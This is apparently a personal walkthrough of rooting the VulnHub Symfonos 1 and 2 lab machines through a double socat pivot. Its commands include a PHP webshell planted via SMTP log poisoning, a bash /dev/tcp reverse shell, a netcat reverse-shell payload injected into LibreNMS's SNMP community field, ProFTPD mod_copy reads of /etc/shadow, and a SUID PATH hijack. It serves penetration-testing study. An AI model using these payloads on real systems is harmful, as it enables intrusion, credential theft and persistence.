Symfonos is a pair of **VulnHub** machines (1 and 2) that I wired together in VirtualBox to practise **pivoting** end-to-end, and it's the richest chain in my eJPTv2 lab so far. **Symfonos 1** sits on a host-only network and an isolated internal one; **Symfonos 2** lives only on that internal `10.0.0.0/24`, reachable solely through the first host. Along the way: SMB null-session enumeration and a themed password hint, a **Mail Masta** WordPress LFI (**CVE-2016-10956**) turned into RCE via **SMTP log poisoning**, a **PATH-hijacking** SUID binary for root, then a double `socat` pivot to Symfonos 2 — **ProFTPD `mod_copy`** (**CVE-2015-3306**) to steal `/etc/shadow`, a cracked hash, a *second* pivot to an internal **LibreNMS** panel exploited by hand for a shell, and `sudo mysql` to root. I've kept my own scripts and sessions in full.

## Lab Setup

Both VMs run in VirtualBox. **Symfonos 1** has two NICs — a host-only adapter (`192.168.56.0/24`, my host is `.1`) and an internal network (`10.0.0.0/24`). **Symfonos 2** has only the internal NIC, so it's invisible from my host until I tunnel through the first machine. An ARP scan finds Symfonos 1:

```bash
sudo arp-scan -I vboxnet0 --localnet
# 192.168.56.6   08:00:27:4e:f1:e8   PCS Systemtechnik GmbH
```

# Symfonos 1 — 192.168.56.6

## Reconnaissance & Enumeration

### Port Scan

```bash
sudo nmap -p- -sCV 192.168.56.6 -oN nmap
```

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6
25/tcp  open  smtp        Postfix smtpd (symfonos.localdomain; VRFY enabled)
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian
```

SSH, an SMTP server, Apache, and Samba. SMB is the easiest thing to enumerate without credentials, so that's first.

### SMB — anonymous share and a password hint

A null session lists the shares. `anonymous` is world-readable, and `helios` ("Helios personal share") hints at a user we can't reach yet:

```bash
smbmap -u '' -p '' -H 192.168.56.6
#   print$      NO ACCESS   Printer Drivers
#   helios      NO ACCESS   Helios personal share
#   anonymous   READ ONLY
#   IPC$        NO ACCESS   IPC Service (Samba 4.5.16-Debian)
```

The `anonymous` share holds a single note from "Zeus":

```bash
smbclient \\\\192.168.56.6\\anonymous -N
smb: \> get attention.txt
```

```text
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!
Next person I find using one of these passwords will be fired!
-Zeus
```

Three passwords, handed to us. I drop them into a `passwords.txt` and spray them with `netexec` — `zeus:epidioko` is valid (as Guest), and trying them against the `helios` share, **`helios:qwerty`** unlocks it:

```bash
cat passwords.txt
# epidioko
# qwerty
# baseball

netexec smb 192.168.56.6 -u zeus -p passwords.txt
# [+] \zeus:epidioko (Guest)

smbmap -u 'helios' -p 'qwerty' -H 192.168.56.6
#   helios   READ ONLY   Helios personal share       <-- now readable
```

```bash
smbclient \\\\192.168.56.6\\helios -U helios        # password: qwerty
smb: \> get research.txt
smb: \> get todo.txt
```

`research.txt` is Greek-mythology flavour, but `todo.txt` is the lead:

```text
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

### The WordPress site

`/h3l105` is a **WordPress 5.2.2** install, but it loads broken until I add its vhost — the page source references `symfonos.local`:

```bash
curl -s http://192.168.56.6/h3l105/ | grep "symfonos.local"
# <link rel='dns-prefetch' href='//symfonos.local' />
echo "192.168.56.6 symfonos.local" | sudo tee -a /etc/hosts
```

`wpscan` enumerates the plugins, and one is a gift — **Mail Masta 1.0**, vulnerable to an unauthenticated **Local File Inclusion** (CVE-2016-10956):

```bash
wpscan --url http://symfonos.local/h3l105/ -e u,vp
# [+] mail-masta ... Unauthenticated Local File Inclusion (LFI)  CVE-2016-10956
# [+] site-editor ... Local File Inclusion (LFI)  CVE-2018-7422
# [+] admin  (user)
```

## Initial Access — Mail Masta LFI + SMTP Log Poisoning (CVE-2016-10956)

The exploit (EDB 40290) documents the vulnerable parameter — `count_of_send.php?pl=` passes straight into `include()`:

```bash
curl 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
# root:x:0:0:root:/root:/bin/bash
# ...
# helios:x:1000:1000:,,,:/home/helios:/bin/bash
```

`helios` has no SSH keys to steal, so instead of reading static files I turn the LFI into **RCE via log poisoning**. The include renders whatever file I point it at as PHP, and I can *write* to `helios`'s mail spool by sending him mail — so I put a PHP webshell in the message body over a hand-typed SMTP session:

```text
└─❯ telnet 192.168.56.6 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: Ander
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<pre> <?php system($_GET['cmd']); ?> </pre>
.
250 2.0.0 Ok: queued as 0D7F6406AE
```

Including the mail spool now executes the payload, and `cmd` runs commands:

```bash
curl -s 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=ls+-l'
# ... <pre> total 112
# -rwxr-xr-x 1 helios helios 8126 Jun 28 2019 ajax_camp_send.php ...
```

RCE confirmed. I URL-encode a Bash reverse shell into `cmd` and catch it:

```bash
curl -s 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.1%2F4444%200%3E%261%27'
```

```bash
nc -nlvp 4444
Connection received on 192.168.56.6 43112
helios@symfonos:~$      # the web server runs as helios
```

A shell as **`helios`** (after the TTY upgrade).

## Privilege Escalation — SUID `statuscheck` (PATH Hijacking) → root

The SUID hunt returns a custom binary in `/opt`:

```bash
helios@symfonos:/opt$ find / -perm -4000 2>/dev/null
/opt/statuscheck
```

`strings` reveals what it does — it calls `curl` with a **relative path**, not `/usr/bin/curl`:

```bash
helios@symfonos:/opt$ strings statuscheck
# ...
# system
# curl -I H
# http://lH
# ocalhostH
```

A SUID binary that runs `curl` by name is a textbook **PATH hijack**: I put my own `curl` earlier in `PATH`, and the root-owned binary runs *mine* as root. My `curl` simply sets the SUID bit on bash:

```bash
helios@symfonos:/tmp$ cat curl
chmod u+s /bin/bash
helios@symfonos:/tmp$ chmod +x curl
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
helios@symfonos:/opt$ ./statuscheck
helios@symfonos:/opt$ ls -la /bin/bash
# -rwsr-xr-x 1 root root 1099016 May 15 2017 /bin/bash
```

With bash now SUID-root, `-p` preserves the elevated privileges:

```bash
helios@symfonos:/opt$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/proof.txt
# Congrats on rooting symfonos:1!   (ASCII art trimmed)
```

Root on Symfonos 1.

## Pivoting to the Internal Network

As root, `ip a` shows the second interface — `enp0s8` on the internal `10.0.0.0/24`:

```bash
bash-4.4# ip a | grep -A2 enp0s8
# enp0s8: ... inet 10.0.0.102/24 ... scope global enp0s8
```

First I set up persistence so I don't depend on the fragile reverse shell — generate a key as root and drop my host's public key into `/root/.ssh/authorized_keys`, then I can `ssh root@symfonos.local` whenever I want. A ping sweep then finds the neighbour:

```bash
bash-4.4# for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i >/dev/null && echo "10.0.0.$i up"; done
# 10.0.0.1 up
# 10.0.0.102 up   (symfonos1 itself)
# 10.0.0.103 up   (symfonos2)
```

There's no nmap on the box, so I use a small Bash `/dev/tcp` port scanner:

```bash
# portScan.sh
IP=10.0.0.103

for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/$IP/$port" 2>/dev/null && echo "[+] Host $IP - Port $port (OPEN)" &
done
```

```bash
bash-4.4# ./portScan.sh
# [+] Host 10.0.0.103 - Port 21 (OPEN)
# [+] Host 10.0.0.103 - Port 22 (OPEN)
# [+] Host 10.0.0.103 - Port 80 (OPEN)
# [+] Host 10.0.0.103 - Port 139 (OPEN)
# [+] Host 10.0.0.103 - Port 445 (OPEN)
```

Then I forward every one of those ports out through Symfonos 1 with `socat`, so my host can reach Symfonos 2's services on `192.168.56.6` at a `100xx` port:

```bash
# pivot.sh
socat TCP-LISTEN:10021,reuseaddr,fork TCP-CONNECT:10.0.0.103:21 &
socat TCP-LISTEN:10022,reuseaddr,fork TCP-CONNECT:10.0.0.103:22 &
socat TCP-LISTEN:10080,reuseaddr,fork TCP-CONNECT:10.0.0.103:80 &
socat TCP-LISTEN:10139,reuseaddr,fork TCP-CONNECT:10.0.0.103:139 &
socat TCP-LISTEN:10445,reuseaddr,fork TCP-CONNECT:10.0.0.103:445 &
```

# Symfonos 2 — 10.0.0.103 (via the pivot)

## Reconnaissance Through the Pivot

Scanning the forwarded ports on `192.168.56.6` reveals Symfonos 2 as if it were local:

```bash
sudo nmap -p10021,10022,10080,10139,10445 -sCV 192.168.56.6 -oN nmap2
# 10021  ftp         ProFTPD 1.3.5
# 10022  ssh         OpenSSH 7.4p1 Debian
# 10080  http        WebFS httpd 1.21
# 10139  netbios-ssn Samba
# 10445  netbios-ssn Samba
```

The anonymous SMB share holds a `backups/log.txt` that leaks the box's own layout — a `/etc/shadow` backup at `/var/backups/shadow.bak`, and that the Samba `anonymous` share maps to `/home/aeolus/share`:

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N
smb: \> cd backups ; get log.txt
```

```text
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf
[anonymous]
   path = /home/aeolus/share
```

## ProFTPD mod_copy (CVE-2015-3306) — Stealing the Shadow File

**ProFTPD 1.3.5** has the `mod_copy` module enabled, which exposes `SITE CPFR`/`SITE CPTO` — an **unauthenticated** way to copy any file the ProFTPD process can read to any path it can write. Since the `anonymous` SMB share *is* `/home/aeolus/share`, I copy sensitive files there and read them over SMB. First `/etc/passwd` to learn the users:

```text
└─❯ nc 192.168.56.6 10021
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.0.103]
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/passwd.copy
250 Copy successful
```

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N -c 'get passwd.copy'
cat passwd.copy | grep "sh$"
# root:x:0:0:root:/root:/bin/bash
# aeolus:x:1000:1000:,,,:/home/aeolus:/bin/bash
# cronus:x:1001:1001:,,,:/home/cronus:/bin/bash
```

Then the shadow backup the log told us about:

```text
└─❯ nc 192.168.56.6 10021
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/shadow.bak
250 Copy successful
```

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N -c 'get shadow.bak'
cat shadow.bak
# root:$6$VTftENaZ$...
# aeolus:$6$dgjUjE.Y$...
# cronus:$6$wOmUfiZO$...
```

## Cracking → `aeolus`

The `$6$` hashes are sha512crypt (hashcat mode 1800); `aeolus` falls to rockyou:

```bash
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
# $6$dgjUjE.Y$...:sergioteamo
```

**`aeolus:sergioteamo`**. (The same password also falls to an `hydra` FTP brute-force against the forwarded port — `hydra -l aeolus -P rockyou.txt ftp://192.168.56.6 -s 10021` — a slower alternative to cracking the hash offline.) Those creds log straight into SSH through the pivot:

```bash
ssh aeolus@192.168.56.6 -p 10022      # password: sergioteamo
aeolus@symfonos2:~$ hostname -I
# 10.0.0.103
```

## A Second Pivot — the Internal LibreNMS Panel

As `aeolus`, the interesting services are bound to localhost only — MySQL, SMTP, and a web app on `127.0.0.1:8080`:

```bash
aeolus@symfonos2:~$ ss -nltp
# LISTEN 127.0.0.1:3306
# LISTEN 127.0.0.1:8080
# LISTEN 127.0.0.1:25
```

To reach `8080` from my host I need **two** hops: Symfonos 2 forwards its own `8080` out to the internal network, and Symfonos 1 forwards that on to my host.

```bash
# on symfonos2: expose 127.0.0.1:8080 on the internal interface as :8000
aeolus@symfonos2:/tmp$ socat TCP-LISTEN:8000,reuseaddr,fork TCP-CONNECT:127.0.0.1:8080 &
```

```bash
# on symfonos1 (the pivot): forward :18000 → symfonos2:8000
bash-4.4# socat TCP-LISTEN:18000,reuseaddr,fork TCP-CONNECT:10.0.0.103:8000 &
```

Now my host reaches the panel at `192.168.56.6:18000` — it's **LibreNMS**, and `aeolus:sergioteamo` logs in:

```bash
curl http://192.168.56.6:18000
# Redirecting to http://192.168.56.6:18000/login
```

## LibreNMS `addhost` RCE → `cronus`

LibreNMS 1.46 has a known **command injection** in the *Add Device* flow (EDB 47044): the SNMP **community** string is passed unsanitised into an OS command when the device is polled. The ready exploit created the device but never landed a shell, so I did it by hand. On the **Add Device** page I set a hostname, turn SNMP on, and put a reverse-shell payload in the **Community** field — aimed at `10.0.0.103:4444`, where `aeolus` is listening:

```text
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.103 4444 >/tmp/f) #
```

![LibreNMS Add Device form with the reverse-shell payload in the Community field](/assets/img/VulnHub/Symfonos/cap1.png)

With "Force add" checked the device saves, and the payload fires when SNMP is polled — I trigger it from **Capture Debug Information → SNMP → Run**:

![Capture Debug Information page, SNMP tab, Run button](/assets/img/VulnHub/Symfonos/cap2.png)

```bash
aeolus@symfonos2:~$ nc -nvlp 4444
connect to [10.0.0.103] from (UNKNOWN) [10.0.0.103] 57564
$ whoami
cronus       # LibreNMS runs as cronus
```

A shell as **`cronus`**. After the TTY upgrade I again drop my public key into `~/.ssh/authorized_keys` for stable access.

## Privilege Escalation — `sudo mysql` (GTFOBins) → root

`cronus` can run `mysql` as root with no password:

```bash
cronus@symfonos2:~$ sudo -l
# User cronus may run the following commands on symfonos2:
#     (root) NOPASSWD: /usr/bin/mysql
```

`mysql`'s `\!` runs a shell command — and since it's running as root, that shell is root ([GTFOBins](https://gtfobins.github.io/gtfobins/mysql/)):

```bash
cronus@symfonos2:~$ sudo mysql -e '\! /bin/sh'
# whoami
root
# cat /root/proof.txt
# Congrats on rooting symfonos:2!   (ASCII art trimmed)
```

Root on Symfonos 2 — both machines owned, start to finish through the pivot.

## Key Takeaways

- **A password policy notice is a wordlist.** Zeus's "stop using `epidioko`/`qwerty`/`baseball`" note *was* the credential set — spraying those three with `netexec` unlocked the `helios` share. Password hints, banners and policy files are enumeration gold.
- **LFI becomes RCE wherever you can write a log.** Mail Masta only *included* files, but the mail spool is a file I can write to by sending mail — a hand-typed SMTP message with PHP in the body turned CVE-2016-10956 into command execution. Mail, auth and web logs are all candidates.
- **A relative command in a SUID binary is root.** `statuscheck` calling `curl` by name let me shadow it via `PATH` and run my own code as root. Any SUID program that invokes another binary without an absolute path is a PATH-hijack primitive — `strings` finds them fast.
- **Pivoting is layered, not a single hop.** Reaching Symfonos 2 took a `socat` forward per port; reaching its localhost-only LibreNMS took a *second* `socat` on each host. Scripting the forwards (`portScan.sh`, `pivot.sh`) keeps the double-tunnel manageable and repeatable.
- **`mod_copy` is pre-auth file read/write.** ProFTPD's `SITE CPFR`/`CPTO` copied `/etc/shadow` into an SMB-readable path with no login at all — a reminder that an "anonymous, read-only" share plus an unauthenticated copy primitive equals full credential disclosure.
- **Monitoring tools run commands for a living.** LibreNMS polls devices by shelling out, so an unsanitised SNMP community string is RCE as the service account. Admin access to an NMS is close to code execution on its host by design — segment and lock them down accordingly.
